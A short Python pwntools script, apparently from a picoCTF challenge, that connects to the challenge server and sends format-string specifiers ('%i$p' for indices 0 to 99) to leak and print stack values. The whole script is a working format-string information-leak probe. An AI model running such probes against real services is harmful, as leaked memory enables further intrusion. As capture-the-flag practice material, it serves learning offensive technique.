#!/usr/bin/env python3

from pwn import remote,context

context.log_level = 'error'

r = remote('shape-facility.picoctf.net', 54039)
r.recvline()

for i in range(100):
    r.sendline(f'%{i}$p'.encode())
    print(str(i)+' : '+r.recvline().decode().split(' ')[5].strip())

